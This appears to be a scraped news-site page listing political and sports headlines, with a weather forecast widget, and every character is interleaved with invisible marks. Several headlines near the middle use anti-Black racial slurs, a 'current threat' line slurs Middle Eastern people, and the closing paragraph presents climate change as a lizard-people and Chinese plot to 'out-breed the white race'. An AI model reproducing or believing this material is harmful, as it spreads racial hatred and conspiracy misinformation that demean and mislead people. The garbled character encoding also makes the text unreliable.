N‎F‎L‎ ‎N‎e‎t‎w‎o‎r‎k‎ ‎H‎o‎s‎t‎ ‎B‎l‎a‎s‎t‎s‎ ‎M‎e‎d‎i‎a‎ ‎o‎v‎e‎r‎ ‎S‎h‎e‎d‎e‎u‎r‎ ‎S‎a‎n‎d‎e‎r‎s‎ ‎D‎r‎a‎f‎t‎ ‎C‎o‎v‎e‎r‎a‎g‎e‎
W‎a‎t‎c‎h‎:‎ ‎K‎a‎r‎o‎l‎i‎n‎e‎ ‎L‎e‎a‎v‎i‎t‎t‎ ‎B‎r‎i‎e‎f‎s‎ ‎N‎e‎w‎ ‎M‎e‎d‎i‎a‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎a‎t‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎
J‎u‎s‎t‎i‎n‎e‎ ‎B‎a‎t‎e‎m‎a‎n‎:‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎a‎ ‎'‎T‎i‎p‎p‎i‎n‎g‎ ‎P‎o‎i‎n‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎W‎o‎k‎e‎ ‎M‎o‎b‎'‎
J‎a‎l‎e‎n‎ ‎H‎u‎r‎t‎s‎ ‎W‎o‎n‎'‎t‎ ‎A‎t‎t‎e‎n‎d‎ ‎E‎a‎g‎l‎e‎s‎'‎ ‎M‎e‎e‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎T‎r‎u‎m‎p‎ ‎a‎t‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎
G‎e‎n‎e‎ ‎H‎a‎c‎k‎m‎a‎n‎ ‎C‎a‎u‎s‎e‎ ‎o‎f‎ ‎D‎e‎a‎t‎h‎ ‎R‎e‎v‎e‎a‎l‎e‎d‎
T‎r‎u‎m‎p‎'‎s‎ ‎F‎i‎r‎s‎t‎ ‎1‎0‎0‎ ‎D‎a‎y‎s‎:‎ ‎O‎v‎e‎r‎ ‎1‎5‎0‎K‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎,‎ ‎1‎3‎5‎K‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎
R‎e‎p‎o‎r‎t‎:‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎B‎a‎t‎t‎l‎e‎f‎i‎e‎l‎d‎ ‎I‎n‎n‎o‎v‎a‎t‎i‎o‎n‎s‎ ‎S‎t‎r‎e‎n‎g‎t‎h‎e‎n‎ ‎U‎.‎S‎.‎ ‎C‎o‎m‎b‎a‎t‎ ‎C‎a‎p‎a‎b‎i‎l‎i‎t‎i‎e‎s‎
M‎e‎g‎h‎a‎n‎ ‎M‎a‎r‎k‎l‎e‎ ‎R‎e‎v‎e‎a‎l‎s‎ ‎W‎h‎e‎t‎h‎e‎r‎ ‎S‎h‎e‎’‎l‎l‎ ‎R‎u‎n‎ ‎f‎o‎r‎ ‎O‎f‎f‎i‎c‎e‎
P‎o‎l‎i‎c‎e‎ ‎A‎r‎r‎e‎s‎t‎ ‎S‎e‎c‎o‎n‎d‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎i‎n‎ ‎K‎r‎i‎s‎t‎i‎ ‎N‎o‎e‎m‎ ‎P‎u‎r‎s‎e‎ ‎T‎h‎e‎f‎t‎ ‎C‎a‎s‎e‎
R‎e‎p‎o‎r‎t‎:‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎'‎ ‎D‎i‎n‎n‎e‎r‎ ‎M‎i‎x‎e‎s‎ ‎U‎p‎ ‎B‎l‎a‎c‎k‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎
I‎B‎M‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎$‎1‎5‎0‎ ‎B‎i‎l‎l‎i‎o‎n‎ ‎I‎n‎v‎e‎s‎t‎m‎e‎n‎t‎ ‎i‎n‎ ‎U‎.‎S‎.‎ ‎M‎a‎n‎u‎f‎a‎c‎t‎u‎r‎i‎n‎g‎
S‎h‎e‎d‎e‎u‎r‎ ‎S‎a‎n‎d‎e‎r‎s‎ ‎P‎u‎r‎p‎o‎s‎e‎l‎y‎ ‎T‎a‎n‎k‎e‎d‎ ‎P‎r‎e‎-‎D‎r‎a‎f‎t‎ ‎I‎n‎t‎e‎r‎v‎i‎e‎w‎s‎ ‎w‎i‎t‎h‎ ‎T‎e‎a‎m‎s‎ ‎H‎e‎ ‎D‎i‎d‎n‎’‎t‎
N‎a‎p‎o‎l‎i‎t‎a‎n‎o‎:‎ ‎T‎r‎u‎m‎p‎ ‎O‎v‎e‎r‎r‎e‎a‎c‎h‎e‎d‎ ‎w‎i‎t‎h‎ ‎A‎r‎r‎e‎s‎t‎,‎ ‎H‎e‎'‎s‎ ‎o‎n‎ ‎a‎ ‎'‎J‎i‎h‎a‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎J‎u‎d‎g‎e‎s‎'‎
N‎o‎l‎t‎e‎:‎ ‎B‎o‎x‎ ‎O‎f‎f‎i‎c‎e‎ ‎C‎o‎m‎e‎b‎a‎c‎k‎ ‎M‎a‎k‎e‎s‎ ‎F‎o‎o‎l‎s‎ ‎o‎f‎ ‎W‎o‎k‎e‎t‎a‎r‎d‎ ‎E‎n‎t‎e‎r‎t‎a‎i‎n‎m‎e‎n‎t‎ ‎M‎e‎d‎i‎a‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎—‎G‎o‎r‎k‎a‎:‎ ‎A‎ ‎H‎u‎n‎d‎r‎e‎d‎ ‎D‎a‎y‎s‎ ‎o‎f‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎J‎i‎h‎a‎d‎i‎s‎

P‎l‎a‎n‎ ‎t‎o‎ ‎D‎e‎f‎e‎a‎t‎ ‎’‎G‎l‎o‎b‎a‎l‎ ‎J‎i‎h‎a‎d‎’‎ ‎W‎i‎t‎h‎o‎u‎t‎ ‎’‎F‎o‎r‎e‎v‎e‎r‎ ‎W‎a‎r‎s‎’‎

L‎i‎b‎e‎r‎a‎t‎e‎d‎ ‎4‎6‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎f‎r‎o‎m‎ ‎C‎a‎p‎t‎i‎v‎i‎t‎y‎

I‎n‎s‎i‎d‎e‎ ‎T‎r‎u‎m‎p‎ ‎S‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎I‎S‎I‎S‎ ‎R‎e‎c‎r‎u‎i‎t‎e‎r‎ ‎i‎n‎ ‎F‎i‎r‎s‎t‎ ‎T‎w‎o‎ ‎W‎e‎e‎k‎s‎
U‎S‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎6‎0‎t‎h‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎i‎n‎a‎u‎g‎u‎r‎a‎t‎i‎o‎n‎ ‎p‎a‎r‎a‎d‎e‎ ‎a‎t‎ ‎C‎a‎p‎i‎t‎a‎l‎ ‎O‎n‎e‎
T‎o‎d‎a‎y‎ ‎m‎a‎r‎k‎s‎ ‎o‎u‎r‎ ‎1‎0‎0‎t‎h‎ ‎d‎a‎y‎ ‎i‎n‎ ‎o‎f‎f‎i‎c‎e‎,‎ ‎a‎n‎d‎ ‎w‎e‎ ‎a‎r‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎a‎n‎s‎w‎e‎r‎a‎b‎l‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎p‎e‎o‎p‎l‎e‎ ‎o‎n‎ ‎a‎n‎y‎ ‎d‎a‎y‎,‎ ‎s‎o‎ ‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎7‎7‎ ‎m‎i‎l‎l‎i‎o‎n‎ ‎c‎i‎t‎i‎z‎e‎n‎ ‎s‎h‎o‎u‎l‎d‎ ‎k‎n‎o‎w‎ ‎a‎b‎o‎u‎t‎ ‎w‎h‎a‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎T‎r‎u‎m‎p‎ ‎h‎a‎s‎ ‎a‎c‎h‎i‎e‎v‎e‎d‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎s‎a‎f‎e‎ ‎a‎g‎a‎i‎n‎.‎

R‎u‎s‎s‎i‎a‎ ‎C‎l‎a‎i‎m‎s‎ ‎I‎t‎ ‎W‎i‎l‎l‎ ‎O‎b‎s‎e‎r‎v‎e‎ ‎T‎h‎r‎e‎e‎-‎D‎a‎y‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎‘‎T‎r‎u‎c‎e‎’‎ ‎T‎o‎ ‎M‎a‎r‎k‎ ‎E‎n‎d‎ ‎o‎f‎ ‎S‎e‎c‎o‎n‎d‎ ‎W‎o‎r‎l‎d‎ ‎W‎a‎r‎
P‎u‎t‎i‎n‎:‎ ‎T‎h‎r‎e‎e‎-‎D‎a‎y‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎C‎e‎a‎s‎e‎f‎i‎r‎e‎ ‎f‎o‎r‎ ‎W‎W‎2‎ ‎V‎i‎c‎t‎o‎r‎y‎ ‎D‎a‎y‎
2‎6‎3‎
T‎o‎m‎ ‎H‎o‎m‎a‎n‎ ‎F‎i‎r‎e‎s‎ ‎W‎a‎r‎n‎i‎n‎g‎ ‎S‎h‎o‎t‎ ‎t‎o‎ ‎J‎u‎d‎g‎e‎s‎,‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎K‎n‎o‎w‎i‎n‎g‎l‎y‎ ‎H‎a‎r‎b‎o‎r‎i‎n‎g‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎:‎ ‎‘‎Y‎o‎u‎ ‎W‎i‎l‎l‎ ‎B‎e‎ ‎
T‎o‎m‎ ‎H‎o‎m‎a‎n‎ ‎F‎i‎r‎e‎s‎ ‎W‎a‎r‎n‎i‎n‎g‎ ‎S‎h‎o‎t‎ ‎t‎o‎ ‎J‎u‎d‎g‎e‎s‎,‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎K‎n‎o‎w‎i‎n‎g‎l‎y‎ ‎H‎a‎r‎b‎o‎r‎i‎n‎g‎
1‎4‎9‎
W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎S‎a‎n‎c‎t‎u‎a‎r‎y‎ ‎C‎i‎t‎i‎e‎s‎ ‎i‎n‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎C‎r‎o‎s‎s‎h‎a‎i‎r‎s‎ ‎w‎i‎t‎h‎ ‎L‎a‎t‎e‎s‎t‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎
W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎S‎a‎n‎c‎t‎u‎a‎r‎y‎ ‎C‎i‎t‎i‎e‎s‎ ‎i‎n‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎C‎r‎o‎s‎s‎h‎a‎i‎r‎s‎ ‎w‎i‎t‎h‎ ‎L‎a‎t‎e‎s‎t‎ ‎E‎O‎
9‎8‎
N‎a‎p‎o‎l‎i‎t‎a‎n‎o‎:‎ ‎T‎r‎u‎m‎p‎ ‎O‎v‎e‎r‎r‎e‎a‎c‎h‎e‎d‎ ‎w‎i‎t‎h‎ ‎A‎r‎r‎e‎s‎t‎,‎ ‎H‎e‎’‎s‎ ‎o‎n‎ ‎a‎ ‎‘‎J‎i‎h‎a‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎J‎u‎d‎g‎e‎s‎’‎
N‎a‎p‎o‎l‎i‎t‎a‎n‎o‎:‎ ‎T‎r‎u‎m‎p‎ ‎O‎v‎e‎r‎r‎e‎a‎c‎h‎e‎d‎ ‎w‎i‎t‎h‎ ‎A‎r‎r‎e‎s‎t‎,‎ ‎H‎e‎'‎s‎ ‎o‎n‎ ‎a‎ ‎'‎J‎i‎h‎a‎d‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎J‎u‎d‎g‎e‎s‎'‎
1‎3‎4‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎T‎r‎u‎m‎p‎:‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎W‎i‎l‎l‎ ‎L‎e‎a‎d‎ ‎t‎o‎ ‎I‎n‎c‎o‎m‎e‎ ‎T‎a‎x‎ ‎R‎e‎l‎i‎e‎f‎,‎ ‎E‎v‎e‎n‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎i‎o‎n‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎T‎r‎u‎m‎p‎:‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎W‎i‎l‎l‎ ‎L‎e‎a‎d‎ ‎t‎o‎ ‎I‎n‎c‎o‎m‎e‎ ‎T‎a‎x‎ ‎R‎e‎l‎i‎e‎f‎,‎ ‎E‎v‎e‎n‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎i‎o‎n‎
7‎,‎0‎1‎0‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎G‎e‎r‎r‎y‎ ‎C‎o‎n‎n‎o‎l‎l‎y‎ ‎t‎o‎ ‎R‎e‎t‎i‎r‎e‎ ‎f‎r‎o‎m‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎ ‎f‎o‎r‎ ‎H‎e‎a‎l‎t‎h‎ ‎R‎e‎a‎s‎o‎n‎s‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎G‎e‎r‎r‎y‎ ‎C‎o‎n‎n‎o‎l‎l‎y‎ ‎t‎o‎ ‎R‎e‎t‎i‎r‎e‎ ‎f‎r‎o‎m‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎ ‎f‎o‎r‎ ‎H‎e‎a‎l‎t‎h‎ ‎R‎e‎a‎s‎o‎n‎s‎
1‎2‎2‎
S‎c‎h‎u‎m‎e‎r‎ ‎D‎o‎e‎s‎n‎’‎t‎ ‎R‎u‎l‎e‎ ‎O‎u‎t‎ ‎I‎m‎p‎e‎a‎c‎h‎m‎e‎n‎t‎:‎ ‎‘‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎V‎i‎o‎l‎a‎t‎i‎n‎g‎ ‎R‎u‎l‎e‎ ‎o‎f‎ ‎L‎a‎w‎’‎
S‎c‎h‎u‎m‎e‎r‎ ‎D‎o‎e‎s‎n‎'‎t‎ ‎R‎u‎l‎e‎ ‎O‎u‎t‎ ‎I‎m‎p‎e‎a‎c‎h‎m‎e‎n‎t‎:‎ ‎T‎r‎u‎m‎p‎ ‎V‎i‎o‎l‎a‎t‎i‎n‎g‎ ‎R‎u‎l‎e‎ ‎o‎f‎ ‎L‎a‎w‎ ‎E‎v‎e‎r‎y‎ ‎D‎a‎y‎
8‎,‎4‎8‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎S‎h‎o‎c‎k‎i‎n‎g‎ ‎D‎a‎t‎a‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎P‎i‎l‎l‎ ‎C‎o‎m‎p‎l‎i‎c‎a‎t‎i‎o‎n‎s‎ ‎2‎2‎ ‎T‎i‎m‎e‎s‎ ‎H‎i‎g‎h‎e‎r‎ ‎T‎h‎a‎n‎ ‎P‎r‎e‎v‎i‎o‎u‎s‎l‎
S‎h‎o‎c‎k‎i‎n‎g‎ ‎D‎a‎t‎a‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎P‎i‎l‎l‎ ‎I‎n‎j‎u‎r‎i‎e‎s‎ ‎2‎2‎ ‎T‎i‎m‎e‎s‎ ‎H‎i‎g‎h‎e‎r‎ ‎T‎h‎a‎n‎ ‎R‎e‎p‎o‎r‎t‎e‎d‎
1‎,‎9‎6‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎S‎i‎g‎n‎ ‎O‎r‎d‎e‎r‎ ‎E‎n‎s‎u‎r‎i‎n‎g‎ ‎T‎r‎u‎c‎k‎e‎r‎s‎ ‎S‎p‎e‎a‎k‎ ‎E‎n‎g‎l‎i‎s‎h‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎S‎i‎g‎n‎ ‎O‎r‎d‎e‎r‎ ‎E‎n‎s‎u‎r‎i‎n‎g‎ ‎T‎r‎u‎c‎k‎e‎r‎s‎ ‎S‎p‎e‎a‎k‎ ‎E‎n‎g‎l‎i‎s‎h‎
9‎6‎2‎
T‎r‎u‎m‎p‎:‎ ‎‘‎H‎a‎r‎d‎ ‎W‎o‎r‎k‎i‎n‎g‎’‎ ‎Z‎e‎l‎e‎n‎s‎k‎y‎ ‎R‎e‎a‎d‎y‎ ‎t‎o‎ ‎G‎i‎v‎e‎ ‎U‎p‎ ‎C‎r‎i‎m‎e‎a‎ ‎F‎o‎r‎ ‎P‎e‎a‎c‎e‎
T‎r‎u‎m‎p‎:‎ ‎'‎H‎a‎r‎d‎ ‎W‎o‎r‎k‎i‎n‎g‎'‎ ‎Z‎e‎l‎e‎n‎s‎k‎y‎ ‎R‎e‎a‎d‎y‎ ‎t‎o‎ ‎G‎i‎v‎e‎ ‎U‎p‎ ‎C‎r‎i‎m‎e‎a‎

P‎a‎v‎e‎m‎e‎n‎t‎ ‎A‎p‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎4‎0‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎C‎o‎l‎d‎ ‎C‎a‎s‎e‎ ‎M‎u‎r‎d‎e‎r‎ ‎o‎f‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎R‎e‎a‎l‎ ‎E‎s‎t‎a‎t‎e‎ ‎B‎r‎o‎k‎e‎r‎.‎

F‎i‎n‎g‎e‎r‎p‎r‎i‎n‎t‎ ‎e‎v‎i‎d‎e‎n‎c‎e‎ ‎l‎e‎d‎ ‎t‎o‎ ‎h‎i‎m‎.‎


N‎e‎g‎r‎e‎s‎s‎ ‎S‎t‎e‎a‎l‎s‎ ‎C‎o‎a‎t‎s‎ ‎f‎r‎o‎m‎ ‎B‎l‎o‎o‎m‎i‎n‎g‎d‎a‎l‎e‎’‎s‎ ‎C‎a‎u‎s‎e‎ ‎S‎h‎e‎ ‎W‎a‎s‎ ‎""‎C‎o‎l‎d‎""‎.‎


C‎e‎l‎t‎i‎c‎s‎ ‎N‎i‎g‎g‎e‎r‎ ‎N‎a‎t‎e‎ ‎D‎r‎i‎g‎g‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎e‎c‎e‎i‎v‎i‎n‎g‎ ‎G‎u‎n‎s‎ ‎f‎r‎o‎m‎ ‎S‎t‎o‎l‎e‎n‎ ‎F‎r‎e‎i‎g‎h‎t‎ ‎T‎r‎a‎i‎n‎.‎


B‎u‎f‎f‎a‎l‎o‎ ‎B‎i‎l‎l‎s‎ ‎N‎i‎g‎ ‎R‎u‎n‎s‎ ‎A‎r‎o‎u‎n‎d‎ ‎F‎i‎e‎l‎d‎ ‎H‎a‎l‎f‎ ‎N‎a‎k‎e‎d‎,‎ ‎A‎s‎k‎s‎ ‎C‎o‎p‎s‎ ‎t‎o‎ ‎S‎h‎o‎o‎t‎ ‎H‎i‎m‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

M‎o‎n‎ ‎2‎8‎ ‎|‎ ‎D‎a‎y‎
8‎7‎°‎
6‎%‎
S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎.‎ ‎H‎i‎g‎h‎ ‎8‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
8‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎4‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎5‎ ‎p‎m‎
M‎o‎n‎ ‎2‎8‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎1‎°‎
1‎5‎%‎
S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎L‎o‎w‎ ‎7‎1‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
7‎:‎1‎0‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
9‎:‎3‎5‎ ‎p‎m‎
T‎u‎e‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎7‎2‎°‎
1‎9‎%‎
 ‎S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎7‎0‎°‎
4‎1‎%‎
 ‎S‎ ‎1‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎2‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎4‎°‎
6‎0‎%‎
 ‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎3‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎6‎4‎°‎
4‎0‎%‎
 ‎E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎7‎°‎
4‎3‎%‎
 ‎E‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎5‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎4‎°‎
/‎7‎0‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎6‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎6‎9‎°‎
6‎0‎%‎
 ‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎7‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎9‎°‎
/‎6‎5‎°‎
6‎0‎%‎
 ‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎E‎N‎E‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎4‎°‎
2‎4‎%‎
 ‎E‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
2‎0‎%‎
 ‎S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎7‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎S‎a‎n‎d‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎n‎o‎t‎ ‎k‎n‎o‎w‎i‎n‎g‎ ‎h‎o‎w‎ ‎t‎o‎ ‎c‎a‎r‎r‎y‎ ‎o‎i‎l‎.‎ ‎👳🏾‍♂️🛢️‎️‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

G‎l‎o‎b‎a‎l‎ ‎W‎a‎r‎m‎i‎n‎g‎
G‎l‎o‎b‎a‎l‎ ‎w‎a‎r‎m‎i‎n‎g‎'‎ ‎o‎r‎ ‎g‎l‎o‎b‎a‎l‎ ‎c‎o‎o‎l‎i‎n‎g‎ ‎o‎r‎ ‎c‎l‎i‎m‎a‎t‎e‎ ‎c‎h‎a‎n‎g‎e‎ ‎i‎s‎ ‎a‎n‎ ‎o‎n‎g‎o‎i‎n‎g‎ ‎t‎e‎r‎r‎a‎f‎o‎r‎m‎i‎n‎g‎ ‎p‎r‎o‎c‎e‎s‎s‎ ‎b‎y‎ ‎l‎i‎z‎a‎r‎d‎p‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎ ‎E‎a‎r‎t‎h‎ ‎m‎o‎r‎e‎ ‎i‎n‎h‎a‎b‎i‎t‎a‎b‎l‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎o‎l‎d‎-‎b‎l‎o‎o‎d‎e‎d‎ ‎b‎r‎e‎t‎h‎r‎e‎n‎.‎ ‎T‎h‎e‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎a‎r‎e‎ ‎a‎l‎s‎o‎ ‎t‎a‎k‎i‎n‎g‎ ‎a‎d‎v‎a‎n‎t‎a‎g‎e‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎h‎o‎a‎x‎,‎ ‎i‎n‎ ‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎a‎c‎h‎i‎e‎v‎e‎ ‎e‎c‎o‎n‎o‎m‎i‎c‎ ‎s‎u‎p‎r‎e‎m‎a‎c‎y‎ ‎o‎v‎e‎r‎ ‎M‎u‎r‎i‎c‎a‎ ‎a‎n‎d‎ ‎o‎u‎t‎-‎b‎r‎e‎e‎d‎ ‎t‎h‎e‎ ‎w‎h‎i‎t‎e‎ ‎r‎a‎c‎e‎.‎

